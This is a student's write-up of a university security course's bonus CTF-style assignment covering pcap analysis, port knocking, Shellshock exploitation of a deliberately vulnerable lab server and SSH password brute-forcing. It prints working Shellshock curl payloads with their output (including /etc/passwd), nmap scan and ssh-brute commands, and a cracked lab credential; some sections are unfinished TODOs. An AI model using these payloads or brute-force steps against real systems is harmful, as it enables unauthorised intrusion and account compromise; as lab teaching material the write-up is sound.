# Bonus assignment
**Author**: Tomáš Hořovský 

**Email**: horovtom@fel.cvut.cz

This was the final bonus assignment for the BSY course at ČVUT Prague. 

As an entry point for this assignment, we got a `.pcap` file and an IP address of submission server.

# Part 1

First, I went to the submission server and entered some random data to get all the different questions:

* What is the name of the victim computer?
* What is the periodicity of the communication in seconds? (Remove decimals, for example 122.7 becomes 122)
* How many times did the victim computer connect to the C&C IP?
* What is the DNS server IP address?

I downloaded the pcap file from the website and started to go through the traffic. At first, I thought that there might be something in the DNS traffic, so I started going through it. There were some pretty weird packets going around...
All of it was going to/from `1.1.1.1`, so I figured this would be the ip of the DNS server, they were asking about.
TODO


After a while, I filtered all HTTP traffic and ...
TODO

I started going through the packets randomly. After a while I noticed some SSL traffic. The info to these packets was: `Continuation Data`, which I found peculiar, so I looked into it. The computer was communicating with `37.48.125.108`. I pasted this address into virustotal and got a positive scan. After filtering this ip address (`ip.addr == 37.48.125.108`) I noticed that these requests are repeating periodically. 

```
01:41:27.9
01:46:28.8
01:51:29.3
01:56:29.8
02:01:30.3
```

I calculated the difference to be about `300` seconds. So that might be the answer to the second question. In one of the packets, there was something, that resembled the name of the computer: `robert-PC`

I counted all the SSL packets that went from `10.0.2.15` to `37.48.125.108`, there were 8 packets. But there were another TCP packets. I did not know, whether I should count them in, or not. Counting all the packets, regardless of the protocol, there were 22 packets: 8 SSL requests, 8 TCP answers 2 tcp connections that got acknowledged.

I tried to upload the answers I got, but there were only 3/4 correct. After checking every answer, I ruled out the last three questions. It seemed like I got the name of the computer wrong. I tried a couple of alternatives: `robert`, `robert-pc` and finally got further when I entered: `ROBERT-PC`. I got this as a response:

```shell
class@ubuntu8:~$ ncat 192.168.1.167 9292

(((((((((((####(########################################%%#(##/##(#####%##(###%######%###/#(#/####(#%#%%##################################(##(#((((((((((((((((
((((((((##(#(((##(######################################%#(((##(/##((#((##########(##(((#((##/(((#((#%#%##############################(#######(((((((((#(((((((
((((((#((##(###########################################%##(#(########(#((#(########(((((############((#%######################################(#(#(((((((((((((
((((#((###(#((######################################%%#######%%%#%#%#####(#(#(#%###((####%#%%%%%%#%###(#%%#################################(####(####((((#(((((
#((##((#(##(#####################################%%%%#%%%%%%%%%%%%%%%#####%#(#((#######%%%%%%%%%#%#%%####%%#################################(####(#((##((((((((
((########(#######################################%%##%##%####%##%%#%%%%%%##########%#%#%#%#%%%%###%###(##%##%########################################(((#(((((
#####(#########################################%%&%#%###(#####(#(##%##%#%%%#########%%%%%###%(###(((#((#####%%%###################################(####(((#(((#
(#####(######################################%%%&%###(#(##((#(##%########%%%#%%%%%#%########((#((####(#####(#%%#%%###################################(####((#(#
(#(#(#####################################%###%%%####((#((########(#(##(##%#%%%%%%#%###(#####%###%#########/(#&%%#######################################(##(#((
#(##########################################%%%%##(#(%#%#%###############(##%#%#%%###########%##%%##%%%%%(#*(/#%%%##################################(##(###((((
#(#####(#####################################%%#(##%%%%%%%%#%#%##%#%#####(###%%#%###########%%%%%%%%%#%%%#(#(###%###################################(###(((#(
(########################################%%%%%%####%%%%%%%%%%%%%%%%%%#%######%%%%%######%%%%%%%%%%%&%%%%%(#(((((#%######################################(#(#(
###########################################%%%%#/(#%%%#%%%%%%%%%%%%%%%%%#####%%%%###%#%%%%%%%%%%&(%%#%(/(,,*//(**%%%%##########################################
############################################%%*/,,.*/(//(%#%(#(%%%%%%%%%%%%###%#%##%%%%%%%%%%%%/###*/*/**(//(*((*###%%#########################################
#######################################%#%###/,,,*.. ,*,(/,*#*((%%&%%%%%%%%%#%##%#%%%%%%%%%%####/*,,/*///***..*,,((############################################
#########################################%%#/,,,*,...,,*,///*//**(%%%%&%%%%%%#####%%%%%%%#((/,*,(,*,,,,,**.. .*/*(#%###%#######################################
#######################################%##%#(((.,..,,,,*,.,.. .,///,/(%%%%%%#(%###%%%%#*/*/,/*(/*,  ,..,.,**,,***//%%%%%#######################################
###################################%&&&&%%%//(/*,,**.,.    /((/*  ..../,/######%(##*((*/,/,. /(####*  .,,,*,*,*,***/(%&%%%%#%##################################
####################################%#%%%#(//***,,,,,,...,##%%%%%.   ., **. ..##, ..,/.      ,&&&&&%# .,*******//////#%&&%%##%###############################(#
###################################&&&(#((/(**/**/*****,*.(%&&&@@,@   .#/**..**,/,,.,(# ,.  *.@@@@&%/*/*//*//*/((//*//((%&%%%%#################################
###############################%&%%&%%##(((((/*/(((((((/((/(*#&@@@@/,&%( .,(#%%%%%#/,./%&/ /@@@@@,(*//((//((((((((*(((##%&&%%%%%#############################
############################%#%%#%&%##((((#((###((#((((((/(((#######((((###%%%%%%%%#%((((#(///((#((((/(((((((((#(((((((/(#((%%&%%%%#%%####%####################
##########################%&%%&%#####(##((##/#(###/(##((##((#(########%%#%%%%%%%%%%%%%%#########((((#(#(((((#((((//(####/((##%%%%%%############################
#############################%%%&%##(##(((#(######((#%##%###%%%#%%%%%%%%%%&%%&%&&%%&%%%%%%%%##########((((((#(#(((/((#/(((####%&&%%%%#%%%######################
###########################%%%%%###(#####(#(###########%##%%%%&&&&&&&&&&/(#%%%%#(/&%&%&%%%%%%%%%#############((#####/(##(((%%%&%#############################
#########################%#%%&&%###((#((((#%%##(########%%%%%&&%&&&&&&&&&(*(/((#((/(*&&&&&&&&&&&%&%%#############(########((###%%%%#%##########################
###########################%%%%%###((#(###########(##%%%%%&&&&&&&&&&&&&%,.*//(//*,,&&&&&&&&&&%&&%%%%#################(((/(##%##&%##%#########################
##########################%&&&&%#######(((######(#####%%%%%&%&&&&&&&&&&&&&&&%.,,,/#&&&&&&&&&&&&&&&%%%%##%##########(((((#(((((%%%%%############################
######################%%%%%&%%%%#%#(###(#%%%####(###%%%%%%%%%%%%&&&&&&&&&&&&&%%%&&&&&&&&&&&&&&&%%%%%%%%%########(####(#(//#((###%%#%#########################
########################%%%%%%%#%####(###(###/#####%%%%%%%%%%%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%%%%%%%%%%########((##(###(%(##%#&%%#%#########################
#####################%##%#&%%%&%##%(##(##(##(######%%%%#%#%%%%%&%&%&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%%%%%#%%%%%######(##(#(##/((%%%%%%%&%##########################
#######################%##%%&%&&&######/%##(#####%%%#%#%%%%%%%%%%%&&%&&&&&&%%&&&&&&&&&&&&%%%%%%%%%%##%%#%########(##(#(((####%%%%%#%%%##%####################
########################%#%%%&&%&%###(###(#########%%###%#%%%%%%%%%%%%&&&&&&&&%&&&&&&&%&%%%%%%%%%%%#%#%%%%####(######(((/#(##%%&%%&%%%#########################
#########################%#%&%%&%######((((#######%######%%###%%%%%%%%%%%%%%%%%%%%&%%%&%%%%%%%%%%#%%%##########((##((#((//(#%&%#&%%%%##########################
#####################%####%#%%%%%####((((((#((#####%##(####%#####%#%%%%%%%%%%%%%%%%%%%%%%%%%#%#%%###%#%#%#%%###((*(((/(#/((%%&&%#%###########################
##########################%##%&&&%&%###((((((####(#%#################%%###%%###%%%%%%%%%%#%%################%##(#/((#/(*(((#%%&%%#####%########################
###########################%%%&%&%#&%%#(#/(((((######(######(#######################%####%#############(########(((((/**(%%##&%%%%#############################
############################%#%#&%%&(((((((((##########(((##((((*.,*/////,,/(##############################(((//*(*#//((&%&%%%%%%############################
###########################%###%#%#%((/#((((###((##((((((((*/((((((((((%##//,*#(##(###########((#(#######(#(/(/*(*(%%%%%%%%#%##############################
################################%##%&%&%((#((((##((((#(((((#((/(//////////////(((**,,((((((((((((#((((##((#(((((////*//%%%%%%##################################
###################################%%%&%#(((((((#(#//#((((*((((/////(/(//////*////*/(/.(((((((#(//##(##((((((/((/*/*/#%#&%#####################################
###########################%#%##%##%&%%####(/#/((((//##(#(///(///(///////////(//*////*//,/(((((((//((#((#(/(/////**/%(&&%%####%################################
#################################%#%#%#%&&%#///((((////(((////*//*///////(*////*////**/////(((//(//((//#((((/*//*//#%%&%%######################################
#################################%###%#%%&(((((/(///(/((/*/////*/////*////**//*///**//*////////(/((//(////(*/***(#%%%########################################
################################%###%#%%%%&%%%#(((///**///*//////////////,*/***/****//*/*///*///((***/////////*/((&%&%##%######################################
##############################%########%#%%%&&%%#((///*/*////***//***//*/******,**,**,**//***///(///(/////****/(%%%############################################
########################################%%%#%&%&((////********//*************,,********,/***,***//****//*//(%%%%%%%##########################################
##############################%%#####%###%#%%%%&%%#(/(//*******/**********,,,,,,,,****,**********/*****//((%%%%%####%########################################
##################################%########%%%#%%%&%#(///*/***********,,,,,,,,,,,,,,,,,,,,,**,*******//(%&%%%%##%############################################


***************************************************************
Bonus assignment part 1. Not relevant to other assignemnts.
****************************************************************


<Grinch> Please provide your token
AshamedDasher
<Grinch> What is the name of the victim computer?
ROBERT-PC
<Grinch> What is the periodicity of the communication in seconds? (Remove decimals, for example 122.7 becomes 122)
300
<Grinch> How many times did the victim computer connect to the C&C IP?
2
<Grinch> What is the DNS server IP address?
1.1.1.1

<Grinch> Saving you, is that what you think I was doing? Wrong-o. I merely noticed that you're improperly packaged, my dear.
<Grinch> Here is something you migt need later: 3232235903
Knock knock... Your VM might be handy.

Hint: MzcgMzAgMzAgMzAgMmMgMzggMzAgMzAgMzAgMmMgMzkgMzAgMzAgMzAgMmMgMzEgMzAgMzAgMzAgMzA=

<Grinch> This is the end of stage 1. You rock!
```

# Stage 2
The string I got as a hint, was probably encoded using base64. I thought of that because of the equal sign at the end, which is usually used for padding base64 strings to be divisible by three.

After decoding I got: `37 30 30 30 2c 38 30 30 30 2c 39 30 30 30 2c 31 30 30 30 30`. After converting from hexadecimal, I got: `7000,8000,9000,10000` At the moment, I was unsure, what these numbers might mean. They could be port numbers, they could be anything.

I tried to run nmap from my machine, scanning the whole network for these ports: 

```shell
nmap -sS -n -v 192.168.1.3-255 -p 7000,8000,9000,10000`
```

This scan has found only a couple of opened ports:

```
Discovered open port 8000/tcp on 192.168.1.167
Discovered open port 9000/tcp on 192.168.1.193
```

On `192.168.1.167:8000` there is flag server for assignment 3. I did not think this would be relevant to this task, so I looked at `192.168.1.193:9000`. It seemed like there was `cslistener` service running on that port. I searched google for this port/service and got to this [website](https://gr00vehack3r.wordpress.com/category/tutorials/shellcode-fengshui/). 

There was a tutorial of using exploit called `Kung-Fu`, which would open some port and then allow to anybody using that port to input shell commands. In the tutorial, they used port 9000 to do this. I connected using nc to the machine and input a command, just to test, whether I would get an answer:

```shell
200~root@ubuntu8:~# nc 192.168.1.193 9000
whoami
moriarty
^C
```

Well, this looked familiar. Going through the previous assignments, I found out, that we used this machine for one of the previous assignments. This was not it! Back to the drawing board.

I tried to scan the machine designated to this task:

```shell
root@ubuntu8:~# nmap -sS -n -v 192.168.1.167 -p 7000,8000,9000,10000

Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-11 10:32 CET
Initiating ARP Ping Scan at 10:32
Scanning 192.168.1.167 [1 port]
Completed ARP Ping Scan at 10:32, 0.20s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:32
Scanning 192.168.1.167 [4 ports]
Discovered open port 8000/tcp on 192.168.1.167
Completed SYN Stealth Scan at 10:32, 1.21s elapsed (4 total ports)
Nmap scan report for 192.168.1.167
Host is up (-0.17s latency).

PORT      STATE    SERVICE
7000/tcp  filtered afs3-fileserver
8000/tcp  open     http-alt
9000/tcp  filtered cslistener
10000/tcp filtered snet-sensor-mgmt
MAC Address: 08:00:27:3B:43:97 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.49 seconds
           Raw packets sent: 9 (364B) | Rcvd: 2 (72B)
```

As previously stated, port 8000 was used for upload of solved assignment 3, so I excluded it from the list. The other ports were filtered. This means that probably the firewall is blocking them. To get through, I could try some exploit. Searching through the internet got me to the Port-knocking technique. It seemed that nmap can do port knocking, so I tried to do that.

```shell
root@ubuntu8:~# nmap -Pn --host-timeout 201 --max-retries 10 -p 7000,9000,10000 192.168.1.167

Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-11 10:38 CET
Nmap scan report for Ubuntu18.lan (192.168.1.167)
Host is up (-0.20s latency).

PORT      STATE    SERVICE
7000/tcp  filtered afs3-fileserver
9000/tcp  filtered cslistener
10000/tcp filtered snet-sensor-mgmt
MAC Address: 08:00:27:3B:43:97 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
```

However I did not notice anything happening. Back to the drawing board.
Starting to get desperate, I looked back at the hints provided earlier. There was this peculiar number: `3232235903`. I spent some time using CyberChef to somehow decode this number. I tried various date converters and compression algorithms. Then I noticed a Networking tab. As the other hint was probably port numbers, there might be something of interest there. Going through these decoders, I found Change IP format node and used it. Finally I got to something promising: 

![cyber_chef_ip_decode](cyber_chef_ip_decode.png) 

I did a quick scan of the `192.168.1.127` address:

```shell
root@ubuntu8:~# nmap -sS -n -v 192.168.1.127

Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-11 10:59 CET
Initiating ARP Ping Scan at 10:59
Scanning 192.168.1.127 [1 port]
Completed ARP Ping Scan at 10:59, 0.20s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:59
Scanning 192.168.1.127 [1000 ports]
Discovered open port 22/tcp on 192.168.1.127
Discovered open port 8081/tcp on 192.168.1.127
Discovered open port 6667/tcp on 192.168.1.127
Discovered open port 902/tcp on 192.168.1.127
Completed SYN Stealth Scan at 11:00, 12.14s elapsed (1000 total ports)
Nmap scan report for 192.168.1.127
Host is up (-0.040s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
902/tcp  open  iss-realsecure
6667/tcp open  irc
8081/tcp open  blackice-icecap
MAC Address: 08:00:27:06:8F:03 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds
           Raw packets sent: 3002 (132.056KB) | Rcvd: 13 (556B)
```

I connected using nc to ports:

* 902 - There was some OpenSSH
* 6667 - There was a cheesy ASCII-art version of Starwars IV
* 8081 - There was some HTTP service.

Next, I focused on the HTTP service:

```shell
root@ubuntu8:~# ncat 192.168.1.127 8081
GET / HTTP/1.1

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.6.9
Date: Sat, 11 Jan 2020 10:03:29 GMT
Content-type: text/html; charset=utf-8
Content-Length: 348

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="www.asdf.com/">www.asdf.com/</a></li>
</ul>
<hr>
</body>
</html>
```

I did not think this would help me, so I moved on. I tried scanning ports `7000,8000,9000,10000` again:

```shell
root@ubuntu8:~# nmap -sS -n -v 192.168.1.127 -p 7000,8000,9000,10000

Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-11 11:08 CET
Initiating ARP Ping Scan at 11:08
Scanning 192.168.1.127 [1 port]
Completed ARP Ping Scan at 11:08, 0.20s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:08
Scanning 192.168.1.127 [4 ports]
Completed SYN Stealth Scan at 11:08, 1.21s elapsed (4 total ports)
Nmap scan report for 192.168.1.127
Host is up (-0.20s latency).

PORT      STATE    SERVICE
7000/tcp  filtered afs3-fileserver
8000/tcp  filtered http-alt
9000/tcp  filtered cslistener
10000/tcp filtered snet-sensor-mgmt
MAC Address: 08:00:27:06:8F:03 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
           Raw packets sent: 10 (408B) | Rcvd: 1 (28B)
```

All of them are filtered. Again, I will try to use the port-knocking technique:

```shell
nmap -Pn --host-timeout 201 --max-retries 0 -p 7000,8000,9000,10000 192.168.1.127
```

Nothing of interest happened. I tried doing it again. Nothing changed. I ran the port scan again, nothing changed. I started going insane. I scanned all the ports on the machine, but I did not find anything that would interest me. I port knocked those ports one by one. I even tried to `nc` on them one by one, nothing worked. However, when I ran the port scan again, to see whether something has changed, I saw a new port opened, which was not previously there:

```shell
root@ubuntu8:~# nmap -sS -n -v 192.168.1.127

Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-11 11:14 CET
Initiating ARP Ping Scan at 11:14
Scanning 192.168.1.127 [1 port]
Completed ARP Ping Scan at 11:14, 0.20s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:14
Scanning 192.168.1.127 [1000 ports]
Discovered open port 8080/tcp on 192.168.1.127
Discovered open port 22/tcp on 192.168.1.127
Discovered open port 8081/tcp on 192.168.1.127
Discovered open port 902/tcp on 192.168.1.127
Discovered open port 6667/tcp on 192.168.1.127
Completed SYN Stealth Scan at 11:15, 18.06s elapsed (1000 total ports)
Nmap scan report for 192.168.1.127
Host is up (-0.018s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
902/tcp  open  iss-realsecure
6667/tcp open  irc
8080/tcp open  http-proxy
8081/tcp open  blackice-icecap
MAC Address: 08:00:27:06:8F:03 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
           Raw packets sent: 3005 (132.188KB) | Rcvd: 19 (820B)
```

```shell
root@ubuntu8:~# ncat 192.168.1.127 8080
GET / HTTP/1.1

HTTP/1.1 400 Bad Request
Date: Sat, 11 Jan 2020 10:17:25 GMT
Server: Apache/2.2.22 (Debian)
Vary: Accept-Encoding
Content-Length: 302
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 172.17.0.3 Port 80</address>
</body></html>

root@ubuntu8:~# ncat 192.168.1.127 8080
GET / HTTP/1.1

HTTP/1.1 400 Bad Request
Date: Sat, 11 Jan 2020 10:17:25 GMT
Server: Apache/2.2.22 (Debian)
Vary: Accept-Encoding
Content-Length: 302
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 172.17.0.3 Port 80</address>
</body></html>

root@ubuntu8:~# ncat 192.168.1.127 8080
GET /index.html
<html>
	<head>
		<style>
			body, pre {
   				color: #7b7b7b;
				font: 300 16px/25px "Roboto",Helvetica,Arial,sans-serif;
			}
		</style>
	<meta name="generator" content="vi2html">
	</head>
	<body>
	</br>
This is a vulnerable web application for showcasing CVE 2014-6271, a.k.a. Shellshock.</br>
</br>
Vulnerability as a Service, brought to you by <a href="https://hml.io/" target="_blank">https://hml.io/</a>.</br>
</br>
For further details please see <a href="https://github.com/hmlio/vaas-cve-2014-6271" target="_blank">https://github.com/hmlio/vaas-cve-2014-6271</a>.</br>
	</br>
Stats:
	</br>
	<iframe frameborder=0 width=800 height=600 src="/cgi-bin/stats"></iframe>
	</body>
</html>
```

So there is a web service that is vulnerable to a specific type of attack, that can be accessed [here](https://github.com/hmlio/vaas-cve-2014-6271)

I ran the attack command:

```shell
root@ubuntu8:~/bonus/vaas-cve-2014-6271# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://192.168.1.127:8080/cgi-bin/stats

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
```

So these are the contents of the passwd file on the `192.168.1.127` machine. Running the `whoami` command on the target machine told me that I was logged in as the `www-data` user. I looked around the filesystem:

```shell
root@ubuntu8:~# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls;'" http://192.168.1.127:8080/cgi-bin/stats

stats
root@ubuntu8:~# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls /;'" http://192.168.1.127:8080/cgi-bin/stats

bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
selinux
srv
sys
tmp
usr
var
root@ubuntu8:~# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls /home;'" http://192.168.1.127:8080/cgi-bin/stats

grinch
root@ubuntu8:~# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls /home/grinch;'" http://192.168.1.127:8080/cgi-bin/stats

XmasPresent.txt
root@ubuntu8:~# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /home/grinch/XmasPresent.txt;'" http://192.168.1.127:8080/cgi-bin/stats

“Maybe Christmas (he thought) doesn’t come from a store. Maybe Christmas perhaps means a little bit more.” — The Grinch
root@ubuntu8:~# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls -la /home/grinch/;'" http://192.168.1.127:8080/cgi-bin/stats

total 256
drwxr-xr-x 2 root root 4096 Dec 20 16:18 .
drwxr-xr-x 1 root root 4096 Dec 20 16:11 ..
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .akhmeade.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .antonni1.txt
-rw-rw-r-- 1 1000 1000  358 Dec 20 14:30 .beranj25.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .bergmpet.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .bokarili.txt
-rw-rw-r-- 1 1000 1000  356 Dec 20 14:30 .cernypat2.txt
-rw-rw-r-- 1 1000 1000  356 Dec 20 14:30 .cizmama2.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .cvachmic.txt
-rw-rw-r-- 1 1000 1000  362 Dec 20 14:30 .dvoravl6.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .dzivjmat.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .elnazavr.txt
-rw-rw-r-- 1 1000 1000  360 Dec 20 14:30 .eykhmvic.txt
-rw-rw-r-- 1 1000 1000  358 Dec 20 14:30 .fadeeeka.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .forstluk.txt
-rw-rw-r-- 1 1000 1000  358 Dec 20 14:30 .frantjir.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .grubejak.txt
-rw-rw-r-- 1 1000 1000  360 Dec 20 14:30 .hallelau.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .hejlluka.txt
-rw-rw-r-- 1 1000 1000  352 Dec 20 14:30 .hodekto1.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .hoftydom.txt
-rw-rw-r-- 1 1000 1000  358 Dec 20 14:30 .hollmdit.txt
-rw-rw-r-- 1 1000 1000  356 Dec 20 14:30 .horovtom.txt
-rw-rw-r-- 1 1000 1000  352 Dec 20 14:30 .ilyasmar.txt
-rw-rw-r-- 1 1000 1000  352 Dec 20 14:30 .jeskepet.txt
-rw-rw-r-- 1 1000 1000  360 Dec 20 14:30 .jiranto2.txt
-rw-rw-r-- 1 1000 1000  358 Dec 20 14:30 .johanada.txt
-rw-rw-r-- 1 1000 1000  358 Dec 20 14:30 .karafvit.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .kloucste.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .kostypet.txt
-rw-rw-r-- 1 1000 1000  352 Dec 20 14:30 .koubadom.txt
-rw-rw-r-- 1 1000 1000  352 Dec 20 14:30 .krulepav.txt
-rw-rw-r-- 1 1000 1000  356 Dec 20 14:30 .kubelpe1.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .latypdin.txt
-rw-rw-r-- 1 1000 1000  358 Dec 20 14:30 .likhatim.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .lupennik.txt
-rw-rw-r-- 1 1000 1000  352 Dec 20 14:30 .mahdarad.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .marekj24.txt
-rw-rw-r-- 1 1000 1000  360 Dec 20 14:30 .mavrireg.txt
-rw-rw-r-- 1 1000 1000  356 Dec 20 14:30 .musilon9.txt
-rw-rw-r-- 1 1000 1000  362 Dec 20 14:30 .novak110.txt
-rw-rw-r-- 1 1000 1000  352 Dec 20 14:30 .novakmat.txt
-rw-rw-r-- 1 1000 1000  356 Dec 20 14:30 .oharatho.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .ondra.prenek.txt
-rw-rw-r-- 1 1000 1000  358 Dec 20 14:30 .repamart.txt
-rw-rw-r-- 1 1000 1000  352 Dec 20 14:30 .richtja9.txt
-rw-rw-r-- 1 1000 1000  352 Dec 20 14:30 .scupamic.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .sedlifil.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .semanja1.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .siegedom.txt
-rw-rw-r-- 1 1000 1000  352 Dec 20 14:30 .stembvac.txt
-rw-rw-r-- 1 1000 1000  352 Dec 20 14:30 .stiplsta.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .svobovo7.txt
-rw-rw-r-- 1 1000 1000  358 Dec 20 14:30 .sykorkry.txt
-rw-rw-r-- 1 1000 1000  356 Dec 20 14:30 .tomanpe9.txt
-rw-rw-r-- 1 1000 1000  350 Dec 20 14:30 .trmaljak.txt
-rw-rw-r-- 1 1000 1000  358 Dec 20 14:30 .vacajaku.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .vankope6.txt
-rw-rw-r-- 1 1000 1000  358 Dec 20 14:30 .volfoane.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .votroto1.txt
-rw-rw-r-- 1 1000 1000  354 Dec 20 14:30 .zachtoma.txt
-rw-rw-r-- 1 1000 1000  350 Dec 20 14:30 .zlamaann.txt
-rw-rw-r-- 1 1000 1000  128 Dec 20 16:18 XmasPresent.txt

root@ubuntu8:~# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /home/grinch/.horovtom.txt;'" http://192.168.1.127:8080/cgi-bin/stats

[a-zA-Z0-9]{3} symetric:
daf1ab1e200d6ed16dda7f2eacf6ac4af8f204275527a0ee79267c79faa7855ea81680396896564d51a1602afb303b533319c71c882783c12af5328bb80d9ad343a19479974699a2d789fe035bf268f9df056d25847873c118e98b78b8de2e73b06a7935e1656601c81160a5c093ca3a20e47a9a4a8f6a36910398b1ed2166373b0a3433403444aa59cf34dd56353f19ea3b51224eb952d93910d761d9a79972192f4ea3
```

So I found something that looks like some cipher. Judging by the hint on the first line, it is gotta be some symetric cipher. The first part is a regex, that will select the first 3 letters of some alphanumeric string. Going through the list of various symmetric ciphers I noticed that a great deal of them were 3-letters. This might have been the purpose of this hint. I had a feeling, that the passphrase for the cipher might be my personal token, because the cipher was in a file with my name. I tried various three-lettered symmetric c ciphers, but most of them needed something else than the passcode. After a while I tried the RC4 cipher and got a deciphered string:

![codeChef_rc4_done](codeChef_rc4_done.png)

```
Hello there! This is the end of stage 2!There are many Elves on the shelf, but Tinsel is special. Instructions for the next stage are in home directory of this elf!
```

I immediately started searching the filesystem for any trace of user Tinsel, but there was nothing I could use. So I tried to use brute force on the ssh port 22. First, I needed to get wordlist for the brute force. I used the rockyou wordlist. I shuffled it using a python script:

```python
with open("passwords.txt", "r") as i:
	strings = i.readlines()

	import random
	random.shuffle(strings)
	with open("passwords_shuffled.txt", "w") as j:
		j.write(''.join(strings))
```

then I started the nmap brute-force scan:

```shell
nmap -sS -sV -v -n 192.168.1.127 --min-parallelism 150 --min-rate 1000 -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords_shuffled.txt,brute.firstonly=true,unpwdb.timelimit=0
```

And let I let this run for a while. However, I did not get any result, even after going through 40 thousand passwords. As the bruteforce would take ages, I ran it in parallel in six screens. Finally after 4 hours, I got a hit!

```shell
Nmap scan report for 192.168.1.127
Host is up (0.00073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-brute: 
|   Accounts: 
|     tinsel:BEAUTIFUL - Valid credentials
|_  Statistics: Performed 468 guesses in 534 seconds, average tps: 1.1
MAC Address: 08:00:27:06:8F:03 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 23:04
Completed NSE at 23:04, 0.00s elapsed
Initiating NSE at 23:04
Completed NSE at 23:04, 0.00s elapsed
